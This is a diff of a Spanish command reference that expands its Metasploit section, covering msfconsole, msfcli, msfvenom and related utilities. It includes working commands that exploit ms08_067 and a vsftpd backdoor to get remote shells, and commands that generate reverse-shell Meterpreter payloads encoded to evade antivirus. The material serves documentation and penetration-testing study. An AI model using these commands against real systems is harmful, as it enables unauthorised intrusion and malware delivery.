@@ -16154,62 +16154,39 @@ Opciones:
 
 msfconsole
 [metasploit]. Consola centralizada con acceso a todo las opciones disponibles de Metasploit Framework, única soportada y estable con soporte para de edición de lineas (readline), que permite tabulacion y ejecución de comandos externos.
-Uso de comandos externos: Lanzar un ping a un equipo o nmap:
-	msf > ping -c 1 192.168.1.10
-	msf > nmap 192.168.1.10
-Obtener ayuda:
-	msf > help
-Mostrar módulos disponibles:
-	msf > show
-Mostrar módulos auxiliares [scanners, modulos de denial of service, fuzzers...]:
-	msf > show auxiliary
-Obtener una lista de todos los exploits:
-	msf > show exploits
-Mostrar listado de los diferentes payloads y para las plataformas disponibles:
-	msf > show payloads
+	msf > ping -c 1 192.168.1.10 (usar ping)
+	msf > nmap 192.168.1.10 (usar nmnap)
+	msf > help (ayuda)
+	msf > show (mostrar módulos disponibles)
+	msf > show auxiliary (mostrar módulos auxiliares [scanners, modulos de denial of service, fuzzers...]
+	msf > show exploits (obtener una lista de todos los exploits)
+	msf > show payloads (mostrar listado de los diferentes payloads y para las plataformas disponibles)
 Nota.- Cuando se está usando un determinado exploit, "show payloads" solo mostrará los que son compatibles para ese exploit concreto.
-Seleccionado un módulo especifico, para mostrar las opciones disponibles y/o requeridas para ese módulo concreto.
-	msf exploit(ms08_067_netapi) > show options
-Mostrar objetivos soportados:
-	msf exploit(ms08_067_netapi) > show targets
-Mostrar las opciones avanzadas de un exploit:
-	msf exploit(ms08_067_netapi) > show advanced
-Buscar cadenas de texto dentro del módulo
-	msf > search ms09-001
-Buscar información detallada [opciones, objetivos....] sobre un determinado modulo
-	msf > info dos/windows/smb/ms09_001_write
-Una vez escogido el módulo en particular, seleccionarlo con:
-	msf > use dos/windows/smb/ms09_001_write
-Y mirar sus opciones requeridas:
-	msf auxiliary(ms09_001_write) > show options
-Conectar a una Ip y a un puerto:
-	msf > connect 192.168.1.10 23
-Para configurar las opciones del modulo que se está utilizando:
-	msf auxiliary(ms09_001_write) > set RHOST 192.168.1.10
-Comprobar de nuevo las opciones del módulo
-	msf auxiliary(ms09_001_write) > show options
-Mostrar codificaciones disponibles:
-	msf exploit(ms08_067_netapi) > show encoders
-Escoger la deseada:
-	msf exploit(ms08_067_netapi) > set encoder x86/shikata_ga_nai
-Comprobar si un objetivo es vulnerable a un exploit sin explotar la vulnerabilidad:
-	msf exploit(ms04_045_wins) > check
+	msf exploit(ms08_067_netapi) > show options (Seleccionado un módulo y mostrar opciones disponibles y/o requeridas para ese concreto)
+	msf exploit(ms08_067_netapi) > show targets (mostrar objetivos soportados)
+	msf exploit(ms08_067_netapi) > show advanced (mostrar las opciones avanzadas de un exploit)
+	msf > search ms09-001 (buscar cadenas de texto dentro del módulo)
+	msf > info dos/windows/smb/ms09_001_write (información detallada [opciones, objetivos....] sobre un determinado modulo)
+	msf > use dos/windows/smb/ms09_001_write (escogido el módulo en particular, seleccionarlo con)
+	msf auxiliary(ms09_001_write) > show options (mirar sus opciones requeridas)
+	msf > connect 192.168.1.10 23 (conectar a una Ip y a un puerto)
+	msf auxiliary(ms09_001_write) > set RHOST 192.168.1.10 (configurar las opciones del modulo que se está utilizando)
+	msf auxiliary(ms09_001_write) > show options (comprobar de nuevo las opciones del módulo)
+	msf exploit(ms08_067_netapi) > show encoders (mostrar codificaciones disponibles)
+	msf exploit(ms08_067_netapi) > set encoder x86/shikata_ga_nai (escoger la deseada)
+	msf exploit(ms04_045_wins) > check (comprobar si un objetivo es vulnerable a un exploit sin explotar la vulnerabilidad)
+	msf > unset RHOST (suprimir una variable entrada para un módulo)
+	msf auxiliary(ms09_001_write) > run (lanzar un exploit)
+	msf auxiliary(ms09_001_write) > back (salir del módulo)
+	msf > irb (cambiar al modo de edición de scripts en ruby)
+1.-
 Para establecer una variable global [setg - save]:
 	msf > setg RHOST 192.168.1.136
 	RHOST => 192.168.1.136
 	msf > save
 	Saved configuration to: /root/.msf3/config
-Suprimir una variable global:
-	msf > unsetg RHOST
-Suprimir una variable entrada para un módulo:
-	msf > unset RHOST
-Lanzar un exploit:
-	msf auxiliary(ms09_001_write) > run
-Salir del módulo:
-	msf auxiliary(ms09_001_write) > back
-Cambiar al modo de edición de scripts en ruby:
-	msf > irb
-1.-
+	msf > unsetg RHOST (suprimir una variable global)
+2.-
 Algunos comandos relacionados con la base de datos propia de metasploit:
 	msf > db_status (Mostrar el estado de la conexión a la BDs y nombre)
 	msf > db_nmap 192.168.1.10 (Lanzar nmap y guardar el resultado en la BDs)
@@ -16217,8 +16194,8 @@ Algunos comandos relacionados con la base de datos propia de metasploit:
 	msf > hosts 192.168.1.10 (Muestra sólo el informe de la ip especificada)
 	msf > services (Muestra todos los servicios de la BDs incluso los inactivos)
 	msf > services -u -R 192.168.1.10 (Muestra los servicios activos [u] del host especificado [R])
-2.-
-Muestra de un scan de puertos:
+3.-
+Ejemplo de muestra de un scan de puertos:
 	Exploradores de puertos disponibles:
 		msf > search portscan
 	Nota.- Los escáners y la mayoría de módulos auxiliares usan la opción RHOSTS en vez de RHOST y puede ser un rango de IP [192.168.1.10-192.168.1.50], rangos CIDR (192.168.1.0/24), múltiples rangos separados por comas (192.168.1.0/24, 192.168.3.0/24) y una lista en un archivo con una ip por linea (file:/tmp/hostlist.txt).
@@ -16232,8 +16209,8 @@ Muestra de un scan de puertos:
 		msf auxiliary(tcp) > run
 Todos los módulos scanner tiene el valor THREADS en "1". Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red. Para modificar el valor:
 	msf > set THREADS 50
-3.-
-Muestra de un ataque
+4.-
+Ejemplo de muestra de un ataque
 MSF > use exploit/unix/ftp/vsftpd_234_backdoor
 Comprobar parámetros que faltan:
 	msf exploit(vsftpd_234_backdoor) > show options
@@ -16258,6 +16235,107 @@ Entrar en la session con ID 1:
 	msf exploit(vsftpd_234_backdoor) > sessions -i 1
 	[*] Starting interaction with 1...
 A partir de este punto estamos en una shell clásica de linux del host 192.168.1.10 donde podemos usar todos los comandos propios de dichas shells.
+
+
+msfbinscan
+Utilidad para analizar archivos binarios y detectar patrones que podrían corresponder a payloads generados con Metasploit.
+# msfbinscan -o -f archivo.bin -s .text (despliega la salida en formato detallado y analizaría la sección .text del archivo en busca de shellcode o patrones conocidos)
+
+
+msfcli
+Interfaz de línea de comandos que permite ejecutar exploits y módulos directamente sin entrar en msfconsole que lo ha reemplazado.
+# msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 E (usando el exploit que afecta a sistemas Windows a través de SMB, el payload que genera una sesión de Meterpreter inversa, LHOST la dirección IP del atacante, LPORT es el puerto esperando la conexión inversa y la opción E ejecuta el exploit)
+# msfcli exploit/windows/smb/ms08_067_netapi O (muestra las opciones del payload)
+
+
+msfd
+daemon de Metasploit que permite conexiones remotas a través de un socket TCP.
+# msfd -S -a 127.0.0.1 -p 55553 (-S iniciar una shell interactiva, -a el daemon se ejecuta en localhost y -p establece el puerto del socket TCP)
+Para conectar a este daemon desde otra terminal:
+# nc 127.0.0.1 55553
+
+
+msfdb
+Administra la base de datos que Metasploit utiliza para almacenar información sobre los objetivos, vulnerabilidades, sesiones, etc.
+# msfdb init (inicializar y configurar una base de datos PostgreSQL para Metasploit)
+# msfdb start (arrancar la base de datos para que Metasploit pueda conectarse a ella)
+# msfdb stop (detener la base de datos)
+# msfdb restart (reiniciar la base de datos)
+# msfdb delete (eliminar la base de datos)
+
+
+msfelfscan
+Se utiliza para escanear archivos ELF [Executable and Linkable Format] en busca de gadgets ROP [Return Oriented Programming], que son útiles para los exploits basados en desbordamientos de búfer.
+# msfelfscan -j /ruta/archivo (escanear un archivo ELF en busca de gadgets ROP)
+# msfelfscan -r /ruta//archivo (escanear un ELF en busca de secuencias que terminen en una instrucción de retorno)
+
+
+msfencode
+Usado para ofuscar o modificar payloads generados con Metasploit. Hoy en día, esta funcionalidad se ha integrado dentro del comando msfvenom.
+# msfencode -e x86/shikata_ga_nai -i shellcode.bin -o encoded.bin -c 3 (usando el encodificado especificado para evadir antivirus, archivo de entrada del payload original, archivo de salida con el shellcode codificado y que el payload será codificado 3 veces)
+# msfencode -e x86/shikata_ga_nai -i shellcode.bin -o encoded.bin -t exe -b '\x00\x0a' (-t para generar un archivo ejecutable y -b excluye ciertos caracteres por ejemplo, \x00 y \x0a para evitar bytes nulos)
+
+
+msfmachscan
+Se utiliza para escanear archivos ejecutables Mach-O, el formato de archivo ejecutable utilizado por macOS, en busca de gadgets ROP [Return Oriented Programming] o para obtener detalles técnicos de los archivos ejecutables.
+# msfmachscan -j /ruta/a/archivo_mach-o (escanea el archivo en busca de gadgets ROP)
+# msfmachscan -r /ruta/a/archivo_mach-o (busca secuencias de retorno)
+# msfmachscan /ruta/a/archivo_mach-o (proporciona información detallada sobre las secciones y los encabezados del archivo)
+
+
+msfpayload
+Utilizado obsolera para generar payloads de manera sencilla, pero ha sido reemplazado por msfvenom, que combina tanto msfpayload como msfencode en una sola herramienta.
+# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.exe (generar un payload de tipo Meterpreter para Windows con una conexión reversa al host y puerto indicados y guardarlo en shell,exe)
+Dado que msfpayload ha sido reemplazado, el comando actual sería:
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
+
+
+msfpescan
+Escanea archivos ejecutables PE [Portable Executable], el formato utilizado en Windows en busca de gadgets ROP, secuencias de retorno, o analiza el archivo en busca de datos.
+# msfpescan -j /ruta/a/archivo_pe (busca gadgets ROP dentro del archivo PE)
+# msfpescan -r /ruta/a/archivo_pe (busca secuencias que terminan con una instrucción de retorno)
+# msfpescan -h /ruta/a/archivo_pe (obtener detalles sobre los encabezados y las secciones del archivo PE)
+
+
+msfremove
+Se utiliza para eliminar módulos antiguos o innecesarios de Metasploit Framework.
+# msfremove exploit/windows/smb/ms17_010_eternalblue (eliminar el exploit mencionado)
+# msfremove auxiliary/scanner/smb/smb_version exploit/windows/smb/ms08_067_netapi (eliminar varios múdulos)
+# msfremove --list (muestra lista de módulos que se pueden eliminar)
+
+
+msfrop
+Se utiliza para identificar gadgets ROP [Return Oriented Programming] en archivos ejecutables o bibliotecas. Estos gadgets son fragmentos de código que terminan en una instrucción de retorno y pueden ser usados en exploits.
+# msfrop /ruta/a/archivo_elf (escanear el archivo ELF especificado en busca de gadgets ROP)
+# msfrop -f pop /ruta/a/archivo_elf (filtrar los gadgets que contienen la instrucción pop)
+# msfrop -s /ruta/a/archivo_elf (muestra el tamaño de las instrucciones que forman los gadgets)
+
+
+msfrpc
+Es un cliente que se conecta a la API RPC de Metasploit, permitiendo a los usuarios controlar Metasploit de forma remota.
+# msfrpc -P password -U msf -a 127.0.0.1 -p 55552 (-P contraseña para autenticarte en el servidor RPC, -U nombre de usuario [msf por defecto], -a dirección IP del servidor RPC y puerto donde corre el servidor RPC)
+Una vez conectado, se puede ejecutar comandos y tareas en Metasploit, por ejemplo, creando una consola y ejecutando el comando para usar un exploit:
+    rpc.call('console.create')
+    rpc.call('console.write', [console_id, "use exploit/multi/handler\n"])
+
+
+msfrpcd
+inicia un demonio que proporciona una API RPC para que otros programas o scripts puedan interactuar con Metasploit.
+# msfrpcd -U msf -P password -a 127.0.0.1 -p 55552 (-U nombre de usuario para conectarse, -P contraseña, -a donde el daemon RPC estará escuchando y númro de puerto de escucha)
+# msfrpcd -S -a 127.0.0.1 -p 55552 (iniciar el demonio sin necesidad de autenticación)
+# msfrpcd -U msf -P password -a 127.0.0.1 -p 55552 -S (-S habilita el uso de SSL para las conexiones RPC)
+
+
+msfupdate
+Actualiza el Metasploit Framework a la versión más reciente disponible desde los repositorios oficiales.
+# msfupdate
+
+
+msfvenom
+Combina las funciones de las antiguas herramientas msfpayload y msfencode para generar y codificar payloads en una sola utilidad.
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe (-p Meterpreter con conexión inversa, LHOST donde el sistema comprometido se conectará, LPORT donde se espera la conexión, -f formato de salida como un archivo ejecutable de Windows y -o guarda el archivo con el nombre shell.exe)
+# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f elf -o shell.elf (-e un codificador, -b excluye ciertos bytes y -i número de iteraciones para codificar el payload)
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c  (genera un payload en formato de código C, que puede ser inyectado directamente en un programa)
 
 
 mtar
